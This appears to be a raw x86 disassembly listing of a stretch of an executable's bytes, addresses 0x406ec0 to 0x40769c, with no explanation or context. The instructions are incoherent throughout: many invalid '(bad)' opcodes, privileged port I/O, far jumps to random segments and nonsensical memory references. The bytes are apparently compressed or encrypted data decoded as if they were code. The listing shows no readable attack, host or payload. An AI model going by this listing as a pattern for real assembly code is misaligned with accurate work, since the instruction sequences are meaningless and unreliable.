  406ec0:	push   es
  406ec1:	dec    ecx
  406ec2:	stos   BYTE PTR es:[edi],al
  406ec3:	sbb    BYTE PTR [edx+0x2c0814d2],cl
  406ec9:	inc    ebp
  406eca:	adc    eax,esi
  406ecc:	xor    DWORD PTR [edx],ecx
  406ece:	push   cs
  406ecf:	mov    edx,0x101141d8
  406ed4:	cdq    
  406ed5:	adc    ebx,DWORD PTR [eax+0x2b7cbd73]
  406edb:	dec    edi
  406edc:	dec    ebp
  406edd:	inc    ebp
  406ede:	pop    es
  406edf:	jns    0x406e78
  406ee1:	push   esi
  406ee2:	inc    edx
  406ee3:	inc    esi
  406ee4:	out    0x6f,al
  406ee6:	adc    eax,0x7bb73b3d
  406eeb:	sub    DWORD PTR [esi-0x70a2fd3],esp
  406ef1:	and    ecx,DWORD PTR [eiz*2+0x56f3d630]
  406ef8:	les    edx,FWORD PTR [ecx+0x21da5831]
  406efe:	add    DWORD PTR ds:0xe3175f8e,ebp
  406f04:	jb     0x406eee
  406f06:	push   ss
  406f07:	jmp    0xfe5575f1
  406f0c:	mov    ah,0xa1
  406f0e:	jl     0x406f32
  406f10:	mov    eax,0x97ac898b
  406f15:	fadd   QWORD PTR ds:0x55b14142
  406f1b:	das    
  406f1c:	ret    0xc660
  406f1f:	xor    DWORD PTR [esi+0x9],0xd2f5b443
  406f26:	outs   dx,DWORD PTR ds:[esi]
  406f27:	inc    DWORD PTR [ebx]
  406f29:	xor    BYTE PTR [ebx+eiz*8],cl
  406f2c:	push   0xe912319b
  406f31:	fs push edi
  406f33:	popa   
  406f34:	push   edi
  406f35:	xchg   DWORD PTR [ebx-0x3a],ebp
  406f38:	scas   eax,DWORD PTR es:[edi]
  406f39:	adc    eax,0xfa649fd3
  406f3e:	push   ds
  406f3f:	(bad)  
  406f41:	mov    edx,0x939405b7
  406f46:	cld    
  406f47:	in     eax,0xe3
  406f49:	mov    cl,0x95
  406f4b:	xor    eax,0xa1ad5af9
  406f50:	sub    eax,0x3889e92
  406f55:	dec    eax
  406f56:	mov    al,ds:0xdec5384a
  406f5b:	loope  0x406f39
  406f5d:	pop    ds
  406f5e:	push   esi
  406f5f:	mov    eax,ds:0x1dc43283
  406f64:	push   ebp
  406f65:	xchg   edx,eax
  406f66:	out    dx,eax
  406f67:	imul   BYTE PTR [ecx+0x5da5e407]
  406f6d:	(bad)  
  406f6e:	push   ebp
  406f6f:	inc    edi
  406f70:	sar    DWORD PTR [edx+0x6cb6abcb],cl
  406f76:	adc    ebp,ebp
  406f78:	bound  edx,QWORD PTR [esi+0x1c]
  406f7b:	dec    edi
  406f7c:	stc    
  406f7d:	fs (bad) 
  406f7f:	and    bh,BYTE PTR [ebp+0x42517f78]
  406f85:	(bad)  
  406f86:	adc    eax,edi
  406f88:	pop    ebp
  406f89:	adc    DWORD PTR [ecx+0x44],0x71
  406f8d:	jae    0x407001
  406f8f:	mov    ds:0xe3acfece,eax
  406f94:	aam    0x11
  406f96:	xor    al,0x47
  406f98:	inc    ecx
  406f99:	data16 daa 
  406f9b:	outs   dx,BYTE PTR ds:[esi]
  406f9c:	mov    ch,0x7d
  406f9e:	and    BYTE PTR [edx+0x8],bl
  406fa1:	push   0x14
  406fa3:	cmp    al,0x79
  406fa5:	je     0x40700e
  406fa7:	retf   0xa538
  406faa:	std    
  406fab:	call   0xe46c92bf
  406fb0:	imul   edx,esp,0x99fc6f03
  406fb6:	add    al,0x6b
  406fb8:	xor    ah,BYTE PTR [eax+0x8]
  406fbb:	shl    DWORD PTR [esi],cl
  406fbd:	mov    esi,0xc26e6a72
  406fc2:	dec    edx
  406fc3:	mov    ebx,0xb0e61adf
  406fc8:	shl    BYTE PTR [esi-0x5fc024f5],1
  406fce:	sbb    BYTE PTR [ecx+0x8301eec],dh
  406fd4:	adc    bl,0xd6
  406fd7:	push   ebp
  406fd8:	inc    ebx
  406fd9:	xor    al,0x89
  406fdb:	bound  esi,QWORD PTR [ebx+0x78]
  406fde:	jmp    0xd57e6508
  406fe3:	push   edx
  406fe4:	bound  cx,DWORD PTR [ecx-0x3f260672]
  406feb:	mov    ds:0x505b73e0,eax
  406ff0:	jnp    0x9e3b689f
  406ff6:	sar    BYTE PTR [ebx],cl
  406ff8:	scas   eax,DWORD PTR es:[edi]
  406ff9:	push   eax
  406ffa:	mov    WORD PTR [ebx-0x4b],ds
  406ffd:	lea    edi,[eax-0x481049ca]
  407003:	pusha  
  407004:	and    eax,0x9056cc8d
  407009:	mov    ds:0x3701543d,al
  40700e:	and    dh,ah
  407010:	adc    esp,ebx
  407012:	popa   
  407013:	xor    BYTE PTR [ecx*8+0x2728a6bd],ch
  40701a:	mov    bl,0xa0
  40701c:	mov    BYTE PTR [esi-0x66499b52],dh
  407022:	inc    ebp
  407023:	pushf  
  407024:	sbb    al,0x55
  407026:	ins    BYTE PTR es:[edi],dx
  407027:	div    DWORD PTR [esi]
  407029:	mov    dh,0xd9
  40702b:	jmp    0x158f:0x72ce5b60
  407032:	ja     0x40707e
  407034:	sub    BYTE PTR [eax+0x672a2d2d],dh
  40703a:	fwait
  40703b:	lea    esi,[eax+0x6e]
  40703e:	push   cs
  40703f:	std    
  407040:	(bad)  
  407041:	pop    edi
  407042:	jnp    0x407069
  407044:	(bad)  
  407045:	cmp    DWORD PTR [ebp-0x2508cde5],ecx
  40704b:	es in  al,dx
  40704d:	into   
  40704e:	cmp    DWORD PTR [ebx+0x32],ebx
  407051:	mov    dh,0xb3
  407053:	mov    bl,0xd2
  407055:	cwde   
  407056:	mov    ah,0x88
  407058:	cs clc 
  40705a:	sti    
  40705b:	retf   
  40705c:	in     eax,0xd4
  40705e:	repz retf 
  407060:	adc    cl,BYTE PTR [edx-0x73]
  407063:	pushf  
  407064:	jmp    FWORD PTR [edi-0x68]
  407067:	(bad)  
  407068:	dec    eax
  407069:	mov    ch,0x2f
  40706b:	outs   dx,DWORD PTR ds:[esi]
  40706c:	pusha  
  40706d:	and    DWORD PTR [ebp-0x51],0xffffff8f
  407071:	ins    BYTE PTR es:[edi],dx
  407072:	jg     0x407033
  407074:	mov    al,0xe2
  407076:	jmp    0xe458a3e1
  40707b:	test   DWORD PTR [ebp-0x2e],eax
  40707e:	xchg   esp,eax
  40707f:	pop    ss
  407080:	mov    ch,0x3
  407082:	mov    ecx,0xdd481151
  407087:	mov    BYTE PTR [edx],dh
  407089:	pop    ebp
  40708a:	sti    
  40708b:	retf   
  40708c:	aam    0x64
  40708e:	aad    0xc3
  407090:	in     eax,0xa7
  407092:	outs   dx,DWORD PTR ds:[esi]
  407093:	inc    edi
  407094:	je     0x407111
  407096:	call   0x892deae8
  40709b:	xchg   ecx,eax
  40709c:	(bad)  
  40709d:	pop    ebp
  40709e:	hlt    
  40709f:	sbb    cl,ch
  4070a1:	adc    al,0x29
  4070a3:	mov    bl,0xd8
  4070a5:	jmp    FWORD PTR [esi-0x1a569ce7]
  4070ab:	push   0xfffffffb
  4070ad:	mov    esi,0x503c505f
  4070b3:	outs   dx,DWORD PTR ds:[esi]
  4070b4:	mov    ah,0x70
  4070b6:	mov    ecx,0xb669c84c
  4070bb:	xchg   ebp,eax
  4070bc:	(bad)  
  4070be:	xchg   ebx,eax
  4070bf:	push   ss
  4070c0:	xchg   ebx,eax
  4070c1:	pushf  
  4070c2:	(bad)  
  4070c3:	cs push edx
  4070c5:	adc    al,0xf6
  4070c7:	push   edx
  4070c8:	adc    DWORD PTR [edx+esi*4-0x6f194d92],0x1
  4070d0:	nop
  4070d1:	add    DWORD PTR [ebx-0x16],esp
  4070d4:	push   ds
  4070d5:	fwait
  4070d6:	cli    
  4070d7:	enter  0xf725,0x3
  4070db:	mov    ds:0xb1a92946,eax
  4070e0:	ss into 
  4070e2:	xor    bl,BYTE PTR ss:[eax]
  4070e5:	pop    esi
  4070e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e7:	js     0x407078
  4070e9:	and    BYTE PTR [edx+0x1ca70455],ch
  4070ef:	or     edx,edi
  4070f1:	and    ecx,DWORD PTR [eax-0x28c344d3]
  4070f7:	in     al,dx
  4070f8:	icebp  
  4070f9:	adc    al,0xba
  4070fb:	test   edi,esp
  4070fd:	dec    edx
  4070fe:	out    0xcd,eax
  407100:	(bad)  
  407102:	pop    esp
  407103:	push   esi
  407104:	or     al,0x5e
  407106:	lods   al,BYTE PTR ds:[esi]
  407107:	call   0xc9db:0x5c84c115
  40710e:	or     al,ch
  407110:	mov    bh,0xdf
  407112:	rcl    bh,0xf6
  407115:	jmp    0xf1e8:0x8d64b936
  40711c:	(bad)  
  40711d:	out    dx,al
  40711e:	test   eax,0x4a507942
  407123:	jbe    0x407181
  407125:	adc    al,0xc8
  407127:	xchg   ecx,eax
  407128:	pop    esi
  407129:	push   esp
  40712a:	pop    ecx
  40712b:	adc    DWORD PTR [edi-0x481daf2a],eax
  407131:	xor    BYTE PTR [ecx+0x429e6e1b],ch
  407137:	cmp    esi,esp
  407139:	cli    
  40713a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40713b:	cmp    eax,DWORD PTR [ecx+0x3343671c]
  407141:	mov    WORD PTR [eax+0x36fc1a15],fs
  407147:	xchg   esi,eax
  407148:	pop    edx
  407149:	dec    ebp
  40714a:	mov    bh,BYTE PTR [edi]
  40714c:	repz xchg ebp,eax
  40714e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40714f:	adc    DWORD PTR ds:0xb48775fa,ebx
  407155:	bound  edx,QWORD PTR [edx]
  407157:	aas    
  407158:	call   0x9222:0x2e2a1829
  40715f:	ins    DWORD PTR es:[edi],dx
  407160:	stos   BYTE PTR es:[edi],al
  407161:	push   0xa1da661b
  407166:	cmp    ah,al
  407168:	dec    eax
  407169:	ins    BYTE PTR es:[edi],dx
  40716a:	mov    BYTE PTR [eax+esi*8-0x105c1640],dh
  407171:	cmp    bl,BYTE PTR [ebp+0x486c0361]
  407177:	je     0x407145
  407179:	or     al,ch
  40717b:	nop
  40717c:	mov    bl,0x27
  40717e:	cmp    BYTE PTR [ebp+0x61],dl
  407181:	retf   
  407182:	or     bh,cl
  407184:	cmp    ecx,DWORD PTR [edi-0x9]
  407187:	je     0x407195
  407189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40718a:	cmp    esp,esp
  40718c:	popa   
  40718d:	adc    DWORD PTR [eax+0x2f],edx
  407190:	loope  0x40711c
  407192:	or     eax,0x90e29335
  407197:	adc    eax,0x321d487e
  40719c:	aaa    
  40719d:	push   esp
  40719e:	jns    0x407191
  4071a0:	sbb    al,0xb2
  4071a2:	mov    al,ds:0x43eb5445
  4071a7:	ds test al,0x4b
  4071aa:	cwde   
  4071ab:	sub    ah,dh
  4071ad:	pop    ebx
  4071ae:	lea    edx,[edi]
  4071b0:	xor    al,0xae
  4071b2:	jbe    0x407199
  4071b4:	(bad)  
  4071b5:	mov    WORD PTR [edi+eiz*2+0x2eb684d3],fs
  4071bc:	scas   eax,DWORD PTR es:[edi]
  4071bd:	sahf   
  4071be:	lods   eax,DWORD PTR ds:[esi]
  4071bf:	sbb    ebp,esi
  4071c1:	pop    ss
  4071c2:	add    al,0xf5
  4071c4:	imul   ebx,DWORD PTR [edx+ecx*8-0x308ed74d],0x2b
  4071cc:	and    eax,DWORD PTR [ecx-0x74]
  4071cf:	inc    edi
  4071d0:	jb     0x407161
  4071d2:	in     al,0xf4
  4071d4:	out    dx,eax
  4071d5:	mov    ch,0x53
  4071d7:	jns    0x40721a
  4071d9:	shl    DWORD PTR [ebx+eax*2],1
  4071dc:	push   cs
  4071dd:	(bad)  
  4071de:	stos   BYTE PTR es:[edi],al
  4071df:	pop    es
  4071e0:	jmp    0x407255
  4071e2:	xchg   esi,ecx
  4071e4:	push   cs
  4071e5:	pop    esp
  4071e6:	imul   edi,DWORD PTR [eax],0xfffffff7
  4071e9:	and    DWORD PTR [edi+0x1a65863e],eax
  4071ef:	fiadd  WORD PTR [ecx+0x7efc069]
  4071f5:	out    dx,al
  4071f6:	mov    ch,bl
  4071f8:	pusha  
  4071f9:	xchg   BYTE PTR [ecx-0x725232a8],dh
  4071ff:	leave  
  407200:	xchg   esi,eax
  407201:	sbb    eax,0x8a640851
  407206:	mov    BYTE PTR [edi],ch
  407208:	push   edi
  407209:	cmp    ah,BYTE PTR [edx+0x2c]
  40720c:	cmp    ebp,eax
  40720e:	aam    0x37
  407210:	xor    eax,0xd6a2c551
  407215:	push   esi
  407216:	add    dl,bh
  407218:	fs mov edi,0xa49567f4
  40721e:	jmp    FWORD PTR [eax-0x28]
  407221:	ror    DWORD PTR [ebx+0xd],1
  407224:	push   edi
  407225:	outs   dx,BYTE PTR ds:[esi]
  407226:	rol    DWORD PTR [ebx-0x55],1
  407229:	test   DWORD PTR [ebx],esp
  40722b:	retf   
  40722c:	adc    al,0x43
  40722e:	dec    ebp
  40722f:	lahf   
  407230:	lods   eax,DWORD PTR ds:[esi]
  407231:	jle    0x40721d
  407233:	or     dl,BYTE PTR [ebp+0x7ab890d4]
  407239:	dec    ecx
  40723a:	and    al,0x91
  40723c:	xchg   edi,eax
  40723d:	pop    ecx
  40723e:	add    cl,BYTE PTR [ecx-0x3efcecf3]
  407244:	add    BYTE PTR [edx+0x7e],0xa7
  407248:	adc    BYTE PTR ds:0xa5ef7ec3,bh
  40724e:	mov    ds:0x5f08e991,eax
  407254:	loop   0x4071f3
  407256:	(bad)
  407259:	ret    0xbc27
  40725c:	add    ebx,DWORD PTR gs:[eax-0x58]
  407260:	popf   
  407261:	mov    al,0xa9
  407263:	push   es
  407264:	popf   
  407265:	pop    edx
  407266:	out    dx,al
  407267:	test   eax,0x98d35324
  40726c:	in     al,0x5
  40726e:	sahf   
  40726f:	xor    BYTE PTR [eax+0xb],ch
  407272:	xchg   ebx,eax
  407273:	push   ecx
  407274:	clc    
  407275:	bound  edi,QWORD PTR [edx+esi*8-0x44a74e9d]
  40727c:	push   ebp
  40727d:	popf   
  40727e:	scas   eax,DWORD PTR es:[edi]
  40727f:	xor    DWORD PTR [edx+0x7d],ecx
  407282:	imul   edi,DWORD PTR [esi-0x5e],0x6e
  407286:	sti    
  407287:	dec    edi
  407288:	and    eax,0x73392c7a
  40728d:	sbb    ah,BYTE PTR [eax]
  40728f:	in     al,0xdf
  407291:	adc    bh,BYTE PTR [ebx-0x71d949fb]
  407297:	retf   
  407298:	xchg   BYTE PTR [esi+0x44f10cc0],al
  40729e:	inc    ebx
  40729f:	sub    edx,DWORD PTR [ecx+esi*1-0x43]
  4072a3:	rol    ebp,1
  4072a5:	mov    edi,0x22ec0cf7
  4072aa:	repz daa 
  4072ac:	vfnmaddpd xmm5,xmm3,xmm2,XMMWORD PTR [edi]
  4072b2:	dec    ebx
  4072b3:	jbe    0x40732c
  4072b5:	push   0x8ac1f0b0
  4072ba:	imul   edi,esi,0x455e8e82
  4072c0:	or     edx,DWORD PTR [ebp+0x46]
  4072c3:	add    BYTE PTR [edx],al
  4072c5:	and    eax,0xb23022db
  4072ca:	adc    ecx,DWORD PTR [ebx+0x2bad88a1]
  4072d0:	int3   
  4072d1:	sti    
  4072d2:	xor    al,0x90
  4072d4:	xor    BYTE PTR [esi+0x62cc9601],bl
  4072da:	int3   
  4072db:	or     esp,eax
  4072dd:	xchg   edx,eax
  4072de:	mov    bl,0x7e
  4072e0:	mov    cl,0x16
  4072e2:	mov    ebx,0x28cb313c
  4072e7:	or     ebp,eax
  4072e9:	xchg   DWORD PTR [ecx+ebp*1],eax
  4072ec:	addr16 xchg ebp,eax
  4072ee:	push   esi
  4072ef:	mov    DWORD PTR [ebx],ebp
  4072f1:	data16 data16 fstp QWORD PTR [edi-0x4d]
  4072f6:	adc    DWORD PTR [ebx],esp
  4072f8:	adc    BYTE PTR [esp+ecx*2],0x1f
  4072fc:	add    al,BYTE PTR [edx+0x48]
  4072ff:	(bad)  
  407300:	retf   0x191d
  407303:	jbe    0x4072b8
  407305:	adc    al,0x4f
  407307:	fcomp  QWORD PTR [ebp+0x1e07240b]
  40730d:	lods   al,BYTE PTR ds:[esi]
  40730e:	cmp    dh,BYTE PTR [ecx]
  407310:	pop    ss
  407311:	or     al,BYTE PTR [esi+0x263d5a1b]
  407317:	dec    ebp
  407318:	cmp    al,0xf0
  40731a:	xor    ch,BYTE PTR [eax]
  40731c:	sub    ecx,ecx
  40731e:	jno    0x4072c6
  407320:	mov    ebp,0x3fd0da57
  407325:	cld    
  407326:	dec    ebp
  407327:	int3   
  407328:	pop    eax
  407329:	inc    esi
  40732a:	jp     0x407328
  40732c:	les    ecx,FWORD PTR [eax+0x26]
  40732f:	sbb    eax,0xffb340e8
  407334:	jl     0x4072e6
  407336:	sub    BYTE PTR [ebx-0x188cc5b6],al
  40733c:	jmp    0x95c5:0x16c110c1
  407343:	mov    dl,0x55
  407345:	push   esi
  407346:	int3   
  407347:	cmp    DWORD PTR [edi],edi
  407349:	fadd   DWORD PTR [eax]
  40734b:	jns    0x4073c4
  40734d:	cdq    
  40734e:	int    0xc3
  407350:	imul   esi,DWORD PTR [edi],0x1a987c92
  407356:	mov    eax,ds:0xa90c7642
  40735b:	(bad)  
  40735c:	fbstp  TBYTE PTR [edi+0x5a74906b]
  407362:	xchg   BYTE PTR [ecx],bl
  407364:	pop    ebp
  407365:	dec    ebp
  407366:	rcl    BYTE PTR [eax+ecx*4-0x64],cl
  40736a:	xchg   esi,eax
  40736b:	or     dl,dh
  40736d:	lods   al,BYTE PTR ds:[esi]
  40736e:	shl    BYTE PTR ds:0x85d71a64,1
  407374:	in     al,0x5e
  407376:	adc    al,BYTE PTR [esi-0x24]
  407379:	mov    ds:0x2b007c58,al
  40737e:	fnstcw WORD PTR [eax+0x17b526a0]
  407384:	mov    ch,0x5f
  407386:	ret    
  407387:	aas    
  407388:	aam    0xdd
  40738a:	nop
  40738b:	lea    ebp,[edi]
  40738d:	shl    DWORD PTR [ebx+0x59],1
  407390:	mov    al,ds:0xb36c44c8
  407395:	inc    eax
  407396:	push   esp
  407397:	test   BYTE PTR [eax+0x5cfdfd0a],0xdd
  40739e:	xchg   BYTE PTR [eax],ch
  4073a0:	inc    edi
  4073a1:	sahf   
  4073a2:	rol    ebp,cl
  4073a4:	retf   0xe8b1
  4073a7:	test   BYTE PTR [edx],ah
  4073a9:	mov    ebp,0xfdb9ca7
  4073ae:	fisttp DWORD PTR [ebx]
  4073b0:	rcr    BYTE PTR cs:[edi],1
  4073b3:	shl    BYTE PTR [edi+eax*1],cl
  4073b6:	or     eax,0x1264a7a1
  4073bb:	fldenv [ecx-0x50]
  4073be:	sub    BYTE PTR [esi+0x46],ch
  4073c1:	jne    0x40741a
  4073c3:	mov    ds:0xaacb0f79,eax
  4073c8:	in     al,0xe7
  4073ca:	inc    ebx
  4073cb:	jb     0x40736b
  4073cd:	mov    bh,0x9c
  4073cf:	pop    ebx
  4073d0:	aaa    
  4073d1:	xchg   bh,cl
  4073d3:	je     0x4073f9
  4073d5:	gs popa 
  4073d7:	mov    dh,BYTE PTR [esi]
  4073d9:	or     BYTE PTR [ebx+ecx*2+0x3c],ch
  4073dd:	and    eax,0xd0cf3ec2
  4073e2:	enter  0x52b0,0xdb
  4073e6:	in     eax,0x89
  4073e8:	xor    BYTE PTR [eax-0x7704eb1e],ch
  4073ee:	aam    0xaa
  4073f0:	bound  ebx,QWORD PTR cs:[eax]
  4073f3:	mov    bl,0xfa
  4073f5:	jle    0x4073cf
  4073f7:	stc    
  4073f8:	leave  
  4073f9:	mov    dh,0xd1
  4073fb:	inc    esi
  4073fc:	mov    DWORD PTR [ebp-0x29],eax
  4073ff:	adc    BYTE PTR [ebp+edi*4-0x7ddede0c],0xd
  407407:	inc    esi
  407408:	out    0xf7,al
  40740a:	mov    edi,0xbe428ca9
  40740f:	clc    
  407410:	and    al,0xf8
  407412:	nop
  407413:	adc    DWORD PTR [edi],edi
  407415:	leave  
  407416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407417:	jo     0x40747c
  407419:	mov    eax,0xed9b94ed
  40741e:	xor    DWORD PTR [ebx+0x6e],edx
  407421:	in     al,0xa8
  407423:	outs   dx,BYTE PTR ds:[esi]
  407424:	or     ecx,DWORD PTR [ecx+0x6220cb4a]
  40742a:	mov    cs,WORD PTR ds:0x3f4994f2
  407430:	fst    DWORD PTR [eax]
  407432:	push   ds
  407433:	stos   DWORD PTR es:[edi],eax
  407434:	jl     0x4073b8
  407436:	xchg   esi,eax
  407437:	ret    0xdf3c
  40743a:	fsubr  QWORD PTR [ecx]
  40743c:	(bad)  
  40743d:	jmp    0x4073ee
  40743f:	jp     0x407447
  407441:	imul   edx,DWORD PTR [esi],0x0
  407444:	xor    ecx,DWORD PTR [edx]
  407446:	fs sub eax,0x958569ac
  40744c:	in     al,0xb9
  40744e:	push   ss
  40744f:	retf   
  407450:	es mov bh,0x80
  407453:	inc    ebp
  407454:	pop    ecx
  407455:	pop    ebp
  407456:	shl    ebx,1
  407458:	fadd   DWORD PTR [ebx-0x34d78b54]
  40745e:	mov    ds:0xde3c0342,ax
  407464:	imul   esp,DWORD PTR [ebp-0x362bc0b4],0xffffffcc
  40746b:	add    bh,ah
  40746d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40746e:	outs   dx,DWORD PTR ds:[esi]
  40746f:	out    dx,eax
  407470:	xchg   ebx,eax
  407471:	sbb    eax,0x87953121
  407476:	mov    esi,0x9b7ed97b
  40747b:	and    BYTE PTR fs:[ebx+0x7],0xe4
  407480:	mov    ch,0xe8
  407482:	lods   eax,DWORD PTR ds:[esi]
  407483:	mov    ecx,0x91bd6e04
  407488:	addr16 in eax,dx
  40748a:	mov    ?,WORD PTR [edx]
  40748c:	js     0x40743a
  40748e:	clc    
  40748f:	jl     0x4074a6
  407491:	ds ds inc ebp
  407494:	retf   0x602e
  407497:	mov    ds:0xb13d9282,al
  40749c:	adc    al,0xb9
  40749e:	jmp    0x407473
  4074a0:	xchg   edi,eax
  4074a1:	js     0x4074e5
  4074a3:	inc    ecx
  4074a4:	mul    DWORD PTR [edx+0x120c98a0]
  4074aa:	adc    ecx,edx
  4074ac:	pop    esi
  4074ad:	fnsave [ebp+0x43]
  4074b0:	push   0xc818c709
  4074b5:	stos   DWORD PTR es:[edi],eax
  4074b6:	arpl   WORD PTR [esi-0x1e],ax
  4074b9:	adc    al,0x41
  4074bb:	pop    esp
  4074bc:	inc    DWORD PTR [ecx]
  4074be:	stos   DWORD PTR es:[edi],eax
  4074bf:	xchg   esi,eax
  4074c0:	lahf   
  4074c1:	sub    bh,cl
  4074c3:	push   ebp
  4074c4:	mov    edi,0x2743cf30
  4074c9:	xlat   BYTE PTR ds:[ebx]
  4074ca:	jecxz  0x4074e4
  4074cc:	dec    edx
  4074cd:	cld    
  4074ce:	jge    0x4074ab
  4074d0:	sbb    BYTE PTR [ecx+0x45],cl
  4074d3:	fwait
  4074d4:	int    0xbe
  4074d6:	rcl    BYTE PTR ds:0x5ac31531,1
  4074dc:	dec    ebp
  4074dd:	cmp    ebp,DWORD PTR [ecx]
  4074df:	or     ah,BYTE PTR [esp+ebx*2-0x5c]
  4074e3:	aam    0x9a
  4074e5:	jmp    0x4074f6
  4074e7:	(bad)  
  4074e8:	xchg   esp,eax
  4074e9:	inc    esp
  4074ea:	pop    esi
  4074eb:	push   esp
  4074ec:	gs push ds
  4074ee:	dec    ecx
  4074ef:	pop    ebx
  4074f0:	mov    ecx,0xbba4f262
  4074f5:	stos   DWORD PTR es:[edi],eax
  4074f6:	add    eax,DWORD PTR [ecx+0x1c80ef12]
  4074fc:	jbe    0x40748f
  4074fe:	inc    edx
  4074ff:	out    0x6b,eax
  407501:	xchg   BYTE PTR [eax+0x2e],dl
  407504:	in     eax,dx
  407505:	lahf   
  407506:	inc    esi
  407507:	dec    ebp
  407508:	dec    ebx
  407509:	cmovg  ecx,DWORD PTR [ecx+ecx*2-0x5f]
  40750e:	cmp    edi,DWORD PTR ss:[esi]
  407511:	in     al,0x3
  407513:	xor    DWORD PTR [edx-0x78],0x76
  407517:	lea    edx,[edi-0x69]
  40751a:	adc    BYTE PTR [ebp+0x6f8371ef],bh
  407520:	lods   al,BYTE PTR ds:[esi]
  407521:	jmp    0xfe36bcb8
  407526:	(bad)  
  407527:	mov    al,ds:0xae5d79b5
  40752c:	ret    0xac6e
  40752f:	add    al,0xf
  407531:	or     bl,bh
  407533:	mov    es,WORD PTR [edi]
  407535:	cdq    
  407536:	inc    eax
  407537:	mov    ecx,0xebb015d4
  40753c:	sub    ecx,DWORD PTR [ebp+0x34082635]
  407542:	lock inc eax
  407544:	retf   0x284a
  407547:	in     eax,0xc
  407549:	xor    eax,0xe39577bc
  40754e:	xchg   ecx,eax
  40754f:	in     al,0x4b
  407551:	mov    eax,ds:0x8d6cb107
  407556:	mov    DWORD PTR [edx+0x19],ebx
  407559:	ins    BYTE PTR es:[edi],dx
  40755a:	dec    esi
  40755b:	enter  0xffd3,0xac
  40755f:	stc    
  407560:	(bad)  
  407561:	arpl   ax,ax
  407563:	cwde   
  407564:	xchg   ebp,eax
  407565:	mov    eax,ds:0xa5b8b14b
  40756a:	mov    al,0x71
  40756c:	jg     0x40753e
  40756e:	and    cl,BYTE PTR [edx+0x23]
  407571:	adc    esi,DWORD PTR [eax]
  407573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407574:	xor    dl,dl
  407576:	aad    0x37
  407578:	sub    bl,BYTE PTR [edi+0x75952c52]
  40757e:	into   
  40757f:	or     cl,cl
  407581:	out    0x8f,al
  407583:	pop    edx
  407584:	sbb    DWORD PTR [edx+0x10],eax
  407587:	fnstsw WORD PTR [ebx-0x3b]
  40758a:	fnstsw WORD PTR [ebx+0x50]
  40758d:	clc    
  40758e:	lods   eax,DWORD PTR ds:[esi]
  40758f:	rol    BYTE PTR [esi-0x51],1
  407592:	xor    ah,dh
  407594:	arpl   WORD PTR [ecx+0x0],dx
  407597:	pop    eax
  407598:	imul   ebx,ecx,0xffffffaf
  40759b:	mov    al,ds:0x93ff0424
  4075a0:	or     bh,BYTE PTR [ebx-0x3c4030fb]
  4075a6:	dec    eax
  4075a7:	fadd   DWORD PTR [bx+si-0x420b]
  4075ac:	stc    
  4075ad:	retf   
  4075ae:	jl     0x407622
  4075b0:	fstp   QWORD PTR [ecx-0x18]
  4075b3:	dec    esi
  4075b4:	add    al,0xec
  4075b6:	jg     0x407566
  4075b8:	mov    ?,WORD PTR [eax]
  4075ba:	mov    al,0x3d
  4075bc:	and    eax,0xf8ba3e08
  4075c1:	fidivr DWORD PTR [ecx+0x74]
  4075c5:	cmp    BYTE PTR [edx-0x72],bl
  4075c8:	cmp    bl,BYTE PTR cs:[ebx]
  4075cb:	stc    
  4075cc:	push   eax
  4075cd:	pop    ds
  4075ce:	out    dx,eax
  4075cf:	jbe    0x40755a
  4075d1:	or     eax,0xdb286cf9
  4075d6:	sbb    eax,0x1a5bb418
  4075db:	push   ss
  4075dc:	(bad)  
  4075dd:	xchg   ebx,eax
  4075de:	je     0x40762e
  4075e0:	inc    DWORD PTR [esp+ecx*8]
  4075e3:	lock fcomp DWORD PTR [ebx]
  4075e6:	rol    DWORD PTR [edi],0x25
  4075e9:	push   edi
  4075ea:	mov    eax,ds:0x7c56c7a6
  4075ef:	mov    edx,0x64af3dc7
  4075f4:	je     0x4075dc
  4075f6:	(bad)  
  4075f7:	lock into 
  4075f9:	cmp    ah,BYTE PTR [edx+0x22]
  4075fc:	repz sub DWORD PTR ds:0xfbef7902,ebx
  407603:	xor    al,0x35
  407605:	scas   eax,DWORD PTR es:[edi]
  407606:	or     al,0x17
  407608:	pop    edi
  407609:	(bad)  
  40760a:	fmul   QWORD PTR [ebx-0x15805be9]
  407610:	cmp    eax,0xbad1ab8b
  407615:	dec    esi
  407616:	mov    ds:0x6abfb7ba,eax
  40761b:	jmp    0xb6ce:0x62e839cc
  407622:	jae    0x40762e
  407624:	pop    edi
  407625:	aam    0x6b
  407627:	idiv   DWORD PTR [ecx-0xe]
  40762a:	jnp    0x407631
  40762c:	adc    bh,BYTE PTR ds:0x9aa9350d
  407632:	add    BYTE PTR [eax-0x34b6c60c],0xa
  407639:	fnclex 
  40763b:	iret   
  40763c:	xlat   BYTE PTR ds:[ebx]
  40763d:	pop    eax
  40763e:	push   ss
  40763f:	repz xchg esp,eax
  407641:	mov    ebx,0x7daef0c1
  407646:	sar    BYTE PTR [eax-0x3d],0xca
  40764a:	fstp   QWORD PTR [edx]
  40764c:	(bad)  
  40764d:	lods   eax,DWORD PTR ds:[esi]
  40764e:	jmp    0xc5d57eab
  407653:	ret    
  407654:	pop    ss
  407655:	mov    ds:0xe3b7614,al
  40765a:	pop    ebp
  40765b:	icebp  
  40765c:	xor    ah,BYTE PTR [ecx+0x3d]
  40765f:	adc    edi,DWORD PTR [esi+0x60676730]
  407665:	and    BYTE PTR [ebx+0x78],ah
  407668:	xor    BYTE PTR [edx-0x71],ch
  40766b:	jle    0x407647
  40766d:	pop    ds
  40766e:	std    
  40766f:	call   ebx
  407671:	push   ebp
  407672:	jle    0x4076e8
  407674:	fdiv   st,st(0)
  407676:	cmp    eax,0xc41d6769
  40767b:	push   0x73
  40767d:	sbb    dh,BYTE PTR [edi-0x1a]
  407680:	push   ecx
  407681:	mov    edx,0xe800ac08
  407686:	inc    ecx
  407687:	ret    0x9b3c
  40768a:	pop    esi
  40768b:	rcl    BYTE PTR [edx],cl
  40768d:	pop    ds
  40768e:	stos   BYTE PTR es:[edi],al
  40768f:	jg     0x407686
  407691:	push   ebp
  407692:	sbb    BYTE PTR [ebx+0x48be5a6f],dl
  407698:	cmp    BYTE PTR [eax+0x10],bh
  40769b:	(bad)  
  40769c:	pop    ss
